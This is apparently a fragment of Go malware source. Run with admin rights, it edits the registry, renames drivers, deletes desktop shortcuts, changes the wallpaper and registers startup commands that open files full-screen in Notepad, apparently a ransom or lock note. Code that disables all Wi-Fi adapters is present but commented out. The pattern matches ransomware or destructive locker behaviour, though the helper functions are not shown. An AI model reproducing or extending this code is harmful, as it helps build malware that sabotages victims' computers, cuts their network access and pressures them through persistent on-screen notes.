package main

import (
	"fmt"
)

func SetupThings() {
	if IsAdmin {
		initReg()
		SetupNotepad()
		RenameDrivers()
	}
	RemoveDesktopShortcuts()
	HandleWallpaper()
	//KillNwAdapters()
	//_ = DeleteAdapters()
}

func KillNwAdapters() {
	NwAdapters := GetWifiAdaptersName()
	for _, adapter := range NwAdapters {
		_ = DisableAdapter(adapter)
	}
}

func SetupNotepad() {
	path, path2 := HandleNotepad()
	if path == "" || path2 == "" {
		return
	}
	err := StartupCommand(fmt.Sprintf("start /MAX %s", path))
	if err != nil {
		return
	}
	err = StartupCommand(fmt.Sprintf("notepad.exe %s", path2))
	if err != nil {
		return
	}
}
